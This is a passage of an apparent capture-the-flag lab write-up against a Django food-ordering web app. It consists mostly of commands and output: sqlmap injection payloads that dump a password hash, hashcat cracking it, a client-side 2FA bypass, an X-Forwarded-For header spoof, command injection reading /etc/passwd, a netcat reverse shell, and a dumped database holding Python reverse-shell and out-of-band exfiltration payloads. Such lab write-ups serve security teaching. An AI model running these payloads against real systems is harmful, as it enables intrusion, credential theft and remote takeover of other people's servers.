test' AND 3386=(SELECT (CASE WHEN (3386=3386) THEN 3386 ELSE (SELECT 9893 UNION SELECT 8553) END))-- QIDa
-----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="password"

test
-----------------------------24513989778820446811340418161--

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: -----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="csrfmiddlewaretoken"

jykYgMxrH4ImK53C7ZcTypcdu5ahwVyWvliqsm6ZWGSJv8gDbCSTqYIkG52r4knu
-----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="username"

test';SELECT SLEEP(5)#
-----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="password"

test
-----------------------------24513989778820446811340418161--

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: -----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="csrfmiddlewaretoken"

jykYgMxrH4ImK53C7ZcTypcdu5ahwVyWvliqsm6ZWGSJv8gDbCSTqYIkG52r4knu
-----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="username"

test' AND (SELECT 4354 FROM (SELECT(SLEEP(5)))zdLd)-- Ccko
-----------------------------24513989778820446811340418161
Content-Disposition: form-data; name="password"

test
-----------------------------24513989778820446811340418161--
---
[15:49:20] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12
[15:49:20] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[15:49:20] [INFO] fetching current database
[15:49:20] [INFO] resumed: food
[15:49:20] [INFO] fetching entries of column(s) 'password' for table 'auth_user' in database 'food'
[15:49:20] [INFO] fetching number of column(s) 'password' entries for table 'auth_user' in database 'food'
[15:49:20] [INFO] resumed: 2
[15:49:20] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[15:49:20] [INFO] retrieved: pbkdf2_sha256$260000$HxnWVrw647R53GeEUksjW5$SggM3ZAh86qRZtnn0VbWOSmHWhckfVvIsMG+jTZstpE=
[15:54:34] [INFO] retrieved: VH6Hj4+eQn5uYGVAxy8Ht7pkVO9oePUpELDdiXFq1M 2
Database: food
Table: auth_user
[2 entries]
+------------------------------------------------------------------------------------------+
| password                                                                                 |
+------------------------------------------------------------------------------------------+
| pbkdf2_sha256$260000$HxnWVrw647R53GeEUksjW5$SggM3ZAh86qRZtnn0VbWOSmHWhckfVvIsMG+jTZstpE= |
| VH6Hj4+eQn5uYGVAxy8Ht7pkVO9oePUpELDdiXFq1M 2                                             |
+------------------------------------------------------------------------------------------+

[15:57:16] [INFO] table 'food.auth_user' dumped to CSV file '/home/witty/.local/share/sqlmap/output/10.10.192.246/dump/food/auth_user.csv'
[15:57:16] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 453 times
[15:57:16] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/10.10.192.246'
[15:57:16] [WARNING] your sqlmap version is outdated

[*] ending @ 15:57:16 /2023-08-13/

https://hashcat.net/forum/thread-9076.html

┌──(witty㉿kali)-[~]
└─$ cat hash_crylo 
pbkdf2_sha256$260000$HxnWVrw647R53GeEUksjW5$SggM3ZAh86qRZtnn0VbWOSmHWhckfVvIsMG+jTZstpE=

┌──(witty㉿kali)-[~]
└─$ hashcat -m10000 hash_crylo -a0 /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz, 2058/4180 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

pbkdf2_sha256$260000$HxnWVrw647R53GeEUksjW5$SggM3ZAh86qRZtnn0VbWOSmHWhckfVvIsMG+jTZstpE=:trigger
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 10000 (Django (PBKDF2-SHA256))
Hash.Target......: pbkdf2_sha256$260000$HxnWVrw647R53GeEUksjW5$SggM3ZA...ZstpE=
Time.Started.....: Sun Aug 13 16:06:08 2023 (1 min, 45 secs)
Time.Estimated...: Sun Aug 13 16:07:53 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       27 H/s (8.79ms) @ Accel:64 Loops:256 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2816/14344385 (0.02%)
Rejected.........: 0/2816 (0.00%)
Restore.Point....: 2560/14344385 (0.02%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:259840-259999
Candidate.Engine.: Device Generator
Candidates.#1....: gators -> medicina
Hardware.Mon.#1..: Util: 81%

Started: Sun Aug 13 16:04:26 2023
Stopped: Sun Aug 13 16:07:56 2023

admin:trigger

Enter Your Pin: 



```

![[Pasted image 20230813140103.png]]

![[Pasted image 20230813140527.png]]

What is the name of the first username?

*admin*

What is the password for the above user?

Brute-forcing is out of scope.

*trigger*

![[Pasted image 20230813152329.png]]

### Task 3  Encryption

Find a way to bypass the 2FA PIN and login into the application.

Answer the questions below

```
function submitForm(oFormElement) {
    var xhr = new XMLHttpRequest();
    //xhr.responseType = 'json';
    xhr.onload = function() {
        var encryptedresp = xhr.responseText;
        var k = "8080808080808080";
        var key = CryptoJS.enc.Utf8.parse(k);
        var iv = CryptoJS.enc.Utf8.parse(k);
        var item = encryptedresp;
        var result = CryptoJS.AES.decrypt(item, key,
  {
      keySize: 128 / 4,
      iv: iv,
      mode: CryptoJS.mode.CBC,
      padding: CryptoJS.pad.Pkcs7
  })
        var result = result.toString(CryptoJS.enc.Utf8);
        //////////var jsonResponse = JSON.parse(xhr.responseText);
        var jsonResponse = JSON.parse(result);
        //alert(xhr.responseText);
        //var jsonResponse = xhr.responseText;
        console.log(jsonResponse);
        if (jsonResponse.pin_set == "true") {
            //Redirect to 2fa
            //window.location.replace("/2fa");
            //document.getElementsByClassName
            document.getElementById("loginid").style.display = "none";
            document.getElementById("enterpinid").style.display = "flex";
        } else if (jsonResponse.pin_set == "false") {
            //redirect to set pin
            //window.location.replace("/set-pin");
            document.getElementById("loginid").style.display = "none";
            document.getElementById("createpinid").style.display = "flex";
        } else {
            // Invalid username/ password
            alert(jsonResponse.reason);
        }
    }
    xhr.open(oFormElement.method, oFormElement.action, true);
    xhr.send(new FormData(oFormElement));
    return false;
}


function encrypt() {
    var pass = document.getElementById('pin2').value; {
        //document.getElementById("hide").value = document.getElementById("pin").value;
        var key = "6Le0DgMTAAAAANokdEEial"; //length=22
        var iv = "mHGFxENnZLbienLyANoi.e"; //length=22
        key = CryptoJS.enc.Base64.parse(key);
        iv = CryptoJS.enc.Base64.parse(iv);
        var cipherData = CryptoJS.AES.encrypt(pass, key, {
            iv: iv
        });
        //var data = CryptoJS.AES.decrypt(cipherData, key, { iv: iv });

        //var encryptedAES = CryptoJS.AES.encrypt(pass, "1234567890");
        //var decryptedBytes = CryptoJS.AES.decrypt(Message, "1234567890");
        //var plaintext = decryptedBytes.toString(CryptoJS.enc.Utf8);
        //var hash = CryptoJS.MD5(pass);
        document.getElementById('pin2').value = cipherData;
        return true;
        console.log(document.getElementById('pin2').value)
    }
}


function encrypt2() {
    var pass = document.getElementById('pin3').value; {
        //document.getElementById("hide").value = document.getElementById("pin").value;
        var key = "6Le0DgMTAAAAANokdEEial"; //length=22
        var iv = "mHGFxENnZLbienLyANoi.e"; //length=22
        key = CryptoJS.enc.Base64.parse(key);
        iv = CryptoJS.enc.Base64.parse(iv);
        var cipherData = CryptoJS.AES.encrypt(pass, key, {
            iv: iv
        });
        //var data = CryptoJS.AES.decrypt(cipherData, key, { iv: iv });

        //var encryptedAES = CryptoJS.AES.encrypt(pass, "1234567890");
        //var decryptedBytes = CryptoJS.AES.decrypt(Message, "1234567890");
        //var plaintext = decryptedBytes.toString(CryptoJS.enc.Utf8);
        //var hash = CryptoJS.MD5(pass);
        document.getElementById('pin3').value = cipherData;
        return true;
        console.log(document.getElementById('pin3').value)
    }
}

after we logged we see in console

Object { pin_set: "true", email: "admin@admin.com", success: "true" }

so let's change pin_set to false

debug line 23 (at the time of logging)

  if (jsonResponse.pin_set == "true") {
            //Redirect to 2fa
            //window.location.replace("/2fa");
            //document.getElementsByClassName
            document.getElementById("loginid").style.display = "none";
            document.getElementById("enterpinid").style.display = "flex";
        } else if (jsonResponse.pin_set == "false") {
            //redirect to set pin
            //window.location.replace("/set-pin");
            document.getElementById("loginid").style.display = "none";
            document.getElementById("createpinid").style.display = "flex";
        } else {
            // Invalid username/ password
            alert(jsonResponse.reason);
        }

then in console

allow pasting

jsonResponse = {

"pin_set": "false",

"email": "admin@admin.com",

"success": "true"

}

Object { pin_set: "false", email: "admin@admin.com", success: "true" }

Set Your Pin :

and set a pin u like e.g 1337

and log in again but with the pin u set

Hello, admin


```

![[Pasted image 20230813153547.png]]
![[Pasted image 20230813153626.png]]

Which library is used for encryption and decryption?

*CryptoJS*

Which JSON parameter was used to validate the pin?

*pin_set*

Which encryption method is used?

*AES*

### Task 4  Forbidden Bypass

Look at the response of the forbidden page after login and find a way to bypass it.

Answer the questions below

```
go to /debug 

The page is for Local Users Only

like harder (using burp)

X-Forwarded-For:127.0.0.1

request: 

GET /debug HTTP/1.1

Host: 10.10.205.91

X-Forwarded-For:127.0.0.1

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Cookie: username=admin; password=trigger; csrftoken=ZvCgeGdgx0heHtChpzcLDbo3K9vb8sO69qZFaAnGlhdBVZy9cvVA13vfTMorJNF5; Token=G9e2q6ywEaqk6voNgUYOzFSFlkYYqRUc; sessionid=ji86uvc7azkqlnzyi7terby5rfgqcsvv

Upgrade-Insecure-Requests: 1

response:

HTTP/1.1 200 OK

Server: nginx/1.18.0 (Ubuntu)

Date: Sun, 13 Aug 2023 20:40:27 GMT

Content-Type: text/html; charset=utf-8

Connection: close

X-Frame-Options: DENY

Vary: Cookie

X-Content-Type-Options: nosniff

Referrer-Policy: same-origin

Set-Cookie: csrftoken=ZvCgeGdgx0heHtChpzcLDbo3K9vb8sO69qZFaAnGlhdBVZy9cvVA13vfTMorJNF5; expires=Sun, 11 Aug 2024 20:40:27 GMT; Max-Age=31449600; Path=/; SameSite=Lax

Content-Length: 1173

For Internal Usage
Check for open services

https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html

80 ; cat /etc/passwd 
or
80 & cat /etc/passwd 

and not to forget adding header

X-Forwarded-For:127.0.0.1

http 80/tcp www # WorldWideWeb HTTP domain-s 853/udp # DNS over DTLS [RFC8094] socks 1080/tcp # socks proxy server http-alt 8080/tcp webcache # WWW caching service nbd 10809/tcp # Linux Network Block Device amanda 10080/tcp # amanda backup services canna 5680/tcp # cannaserver zope-ftp 8021/tcp # zope management by ftp tproxy 8081/tcp # Transparent Proxy omniorb 8088/tcp # OmniORB omniorb 8088/udp root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin anof:x:1000:1000:anof:/home/anof:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false crylo:x:1001:1001::/home/crylo:/bin/bash fwupd-refresh:x:114:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin 



```

What extra header can be used to bypass the page?

Check the IP spoof

*X-Forwarded-For*

Which IP is allowed to access the page?

*127.0.0.1*

### Task 5  Exploitation

Exploit the web app to gain access to the machine and submit the flags.

Answer the questions below

```
revshell

80 ; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.8.19.103 1337 >/tmp/f

┌──(witty㉿kali)-[~]
└─$ rlwrap nc -lvnp 1337                                     
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.205.91] 59280
bash: cannot set terminal process group (1185): Inappropriate ioctl for device
bash: no job control in this shell
crylo@crylo:~/Food/food$ id
id
uid=1001(crylo) gid=33(www-data) groups=33(www-data)
crylo@crylo:~/Food/food$ python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
</bash')" || /usr/bin/script -qc /bin/bash /dev/null
crylo@crylo:~/Food/food$ cd /home
cd /home
crylo@crylo:/home$ ls
ls
anof  crylo
crylo@crylo:/home$ cd crylo
cd crylo
crylo@crylo:~$ ls
ls
Food  user.txt
crylo@crylo:~$ cat user.txt
cat user.txt
fa3e352b00adf9d4e967ad0e34d5e59d

crylo@crylo:~$ getent passwd | awk -F: '$3>=1000 && $1!="nobody" {print $1}'
getent passwd | awk -F: '$3>=1000 && $1!="nobody" {print $1}'
anof
crylo
crylo@crylo:~$ getent passwd
getent passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
anof:x:1000:1000:anof:/home/anof:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false
crylo:x:1001:1001::/home/crylo:/bin/bash
fwupd-refresh:x:114:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
crylo@crylo:~$ getent group sudo
getent group sudo
sudo:x:27:anof

or

crylo@crylo:~$ grep '^sudo:' /etc/group

grep '^sudo:' /etc/group
sudo:x:27:anof

crylo@crylo:~/Food/food$ grep -r encrypt .
grep -r encrypt .
./assets/js/aes.js:            _createHelper: function(e) { return { encrypt: function(b, k, d) { return ("string" == typeof k ? c : a).encrypt(e, b, k, d) }, decrypt: function(b, k, d) { return ("string" == typeof k ? c : a).decrypt(e, b, k, d) } } }
./assets/js/aes.js:            b.encryptBlock(e, a);
./assets/js/aes.js:            encrypt: function(a, b, c, d) {
./assets/js/aes.js:            encrypt: function(b, c, d, l) {
./assets/js/aes.js:                b = a.encrypt.call(this, b, c, d.key, l);
./assets/js/aes.js:            encryptBlock: function(a, b) { this._doCryptBlock(a, b, this._keySchedule, t, r, w, v, l) },
Binary file ./accounts/__pycache__/views.cpython-38.pyc matches
Binary file ./accounts/__pycache__/views.cpython-37.pyc matches
./accounts/enc.py:# ciphertext = cipher.encrypt(padded_data)
./accounts/enc.py:# encryptor = AES.new(key, mode, iv)
./accounts/enc.py:# cipher = encryptor.encrypt(pad_text)
./accounts/enc.py:# cipher_text = e.encrypt(padded_text.encode())
./accounts/enc.py:ct = cipher1.encrypt(pad(data, 16))
./accounts/views.py:                cipher_text = e.encrypt(padded_text1.encode())
./accounts/views.py:                cipher_text = e.encrypt(padded_text1.encode())
./accounts/views.py:            cipher_text = e.encrypt(padded_text1.encode())
./accounts/views.py:        ciphertext = cipher.encrypt(padded_data)
./accounts/views.py:        ciphertext = cipher.encrypt(padded_data)
./templates/set-pin.html:        function encrypt() {
./templates/set-pin.html:                var cipherData = CryptoJS.AES.encrypt(pass, key, {
./templates/set-pin.html:                //var encryptedAES = CryptoJS.AES.encrypt(pass, "1234567890");

crylo@crylo:~/Food/food$ ls
ls
accounts  assets  food  manage.py  media  nano  __pycache__  static  templates
crylo@crylo:~/Food/food$ cd accounts
cd accounts
crylo@crylo:~/Food/food/accounts$ ls
ls
admin.py  enc.py    __init__.py  models.py    tests.py  views.py
apps.py   forms.py  migrations   __pycache__  urls.py
crylo@crylo:~/Food/food/accounts$ cat enc.py
cat enc.py
# from Crypto.Cipher import AES
# from Crypto.Util.Padding import pad
from base64 import b64encode, b64decode
import base64


# key = '/I02fMuSSvnouuu+/vyyD7NuSEVDB/0gte/z50dM0b4='
# data = 'hello world!'

# cipher = AES.new(b64decode(key), AES.MODE_CBC, iv=b'0123456789abcdef')
# padded_data = pad(data.encode(), cipher.block_size)
# ciphertext = cipher.encrypt(padded_data)
# print(b64encode(ciphertext))


#from Crypto.Cipher import AES
#from pkcs7 import PKCS7Encoder

#key = "8080808080808080".encode()
#mode = AES.MODE_CBC
#iv = "8080808080808080".encode()
#encoder = PKCS7Encoder()


# encryptor = AES.new(key, mode, iv)
# text = "Test@123"
# pad_text = encoder.encode(text)
# cipher = encryptor.encrypt(pad_text)
# enc_cipher = base64.b64encode(cipher)

# secret_text = '{"success":"false", "reason":"User or Password is invalid"}'
# #key = 'A16ByteKey......'
# mode = AES.MODE_CBC
# #iv = '\x00' * 16

# encoder = PKCS7Encoder()
# padded_text = encoder.encode(secret_text)

# e = AES.new(key, mode, iv)
# cipher_text = e.encrypt(padded_text.encode())

# output = (base64.b64encode(cipher_text))
# print(output.decode("utf-8"))
# #print("56iPf4PPRmHLusqyKpf7QQ==")


from Crypto.Util.Padding import pad, unpad
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
data = b'toor'   # 9 bytes
key = b'\xc9;\xd4b\xce\xc15\x19;\x00Z^Nw\xafp\x10\xce/r\x0c\xf1\x1c&\x1c\x12a\xd9&b"\xc3'
iv = b'!6\x0b\xc7Xg@\xcc\xe3KY\xcfN\x9b\x81\x91'
cipher1 = AES.new(key, AES.MODE_CBC, iv)
ct = cipher1.encrypt(pad(data, 16))

print(ct)

#cipher2 = AES.new(key, AES.MODE_CBC, iv)
#pt = unpad(cipher2.decrypt(b'\x9f\xc9P\xff\xb3Z\x94\x84\x8a\xeb1\xa2/\xba\x8d\xa5'), 16)
#print(pt)
#assert(data == pt)


crylo@crylo:/home$ cd anof
cd anof
crylo@crylo:/home/anof$ ls
ls
default  dump_file.sql
crylo@crylo:/home/anof$ cat dump_file.sql
cat dump_file.sql
-- MySQL dump 10.13  Distrib 8.0.26, for Linux (x86_64)
--
-- Host: localhost    Database: food
-- ------------------------------------------------------
-- Server version	8.0.26-0ubuntu0.20.04.2

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!50503 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `accounts_pin`
--

DROP TABLE IF EXISTS `accounts_pin`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `accounts_pin` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `pin` varchar(750) DEFAULT NULL,
  `pin_set` tinyint(1) NOT NULL,
  `user_id` varchar(150) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `accounts_pin_user_id_1be63223_fk` (`user_id`),
  CONSTRAINT `accounts_pin_user_id_1be63223_fk` FOREIGN KEY (`user_id`) REFERENCES `auth_user` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `accounts_pin`
--

LOCK TABLES `accounts_pin` WRITE;
/*!40000 ALTER TABLE `accounts_pin` DISABLE KEYS */;
INSERT INTO `accounts_pin` VALUES (2,'b\'6pe5VvUNvlRnl9+FRScl6f6CjCUDdzkUf38ogh8hyis=\'',1,'anof'),(3,'b\'ag5NyzfxIXUtv6tmVZJB8ldPd/yql1qUTxf3dLPruIQ=\'',1,'admin');
/*!40000 ALTER TABLE `accounts_pin` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `accounts_pintoken`
--

DROP TABLE IF EXISTS `accounts_pintoken`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `accounts_pintoken` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `pintoken` varchar(750) DEFAULT NULL,
  `user_id` varchar(150) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `accounts_pintoken_user_id_ac7358a2_fk` (`user_id`),
  CONSTRAINT `accounts_pintoken_user_id_ac7358a2_fk` FOREIGN KEY (`user_id`) REFERENCES `auth_user` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=13 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `accounts_pintoken`
--

LOCK TABLES `accounts_pintoken` WRITE;
/*!40000 ALTER TABLE `accounts_pintoken` DISABLE KEYS */;
INSERT INTO `accounts_pintoken` VALUES (5,'1ivdK0SmCTW3b0ZPHDkKMRSWrK6FhQbG','anof'),(12,'RVnDSVqoJ2qKNFYADbaw8sA8s9xrx6ny','admin');
/*!40000 ALTER TABLE `accounts_pintoken` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `accounts_upload`
--

DROP TABLE IF EXISTS `accounts_upload`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `accounts_upload` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `file` varchar(100) DEFAULT NULL,
  `id1` varchar(750) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=14 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `accounts_upload`
--

LOCK TABLES `accounts_upload` WRITE;
/*!40000 ALTER TABLE `accounts_upload` DISABLE KEYS */;
INSERT INTO `accounts_upload` VALUES (1,'burger_slide.png','rt||nslookup+`whoami`.fl46t60zqyg4xow74cds49svmmsdg2.burpcollaborator.net||'),(2,'burger_slide_qlrEZpd.png','nslookup+`whoami`.4chvkvrohn7todnwv14hvyjkdbj37s.burpcollaborator.net'),(3,'burger_slide_fIoq8Hi.png','curl `whoami`.4chvkvrohn7todnwv14hvyjkdbj37s.burpcollaborator.net'),(4,'burger_slide_wQeH7Za.png','export RHOST=\"192.168.0.109\";export RPORT=1234;python -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")\''),(5,'burger_slide_qujxL5h.png','python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.109\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\''),(6,'burger_slide_R7Y4n57.png','python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.109\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\''),(7,'about-img.jpg','python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.109\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'),(8,'about-img_h5yy2HL.jpg','curl 192.168.0.109:1234'),(9,'about-img_eJyeY5N.jpg','curl `whoami`.prkgzg69w8me3y2hamj2ajy5swypme.burpcollaborator.net'),(10,'about-img_ibAZXFQ.jpg','python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.109\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'),(11,'about-img_UMcVhhQ.jpg','python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.109\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); 